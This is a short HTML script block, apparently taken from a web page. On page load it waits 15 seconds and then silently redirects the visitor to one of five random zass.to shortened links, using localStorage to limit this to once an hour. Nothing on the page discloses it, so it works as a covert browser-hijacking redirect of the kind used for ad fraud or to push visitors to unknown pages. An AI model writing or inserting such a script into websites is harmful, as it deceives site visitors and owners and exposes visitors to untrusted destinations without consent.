<script type="975a66e2cf69ea3d18b60e3c-text/javascript">
var lastExecutionTime = localStorage.getItem("lastExecutionTime");
var currentTime = new Date().getTime();

if (lastExecutionTime && currentTime - lastExecutionTime < 3600000) {
  console.log("Script has already run in the past hour.");
} else {
  var links = [
    "https://zass.to/zzn7p",
    "https://zass.to/ms4mr",
    "https://zass.to/se07n",
    "https://zass.to/0xj4s",
    "https://zass.to/j143n"
  ];

  var randomIndex = Math.floor(Math.random() * links.length);

  setTimeout(function () {
    window.location = links[randomIndex];
  }, 15000);

  localStorage.setItem("lastExecutionTime", currentTime.toString());
}
</script>
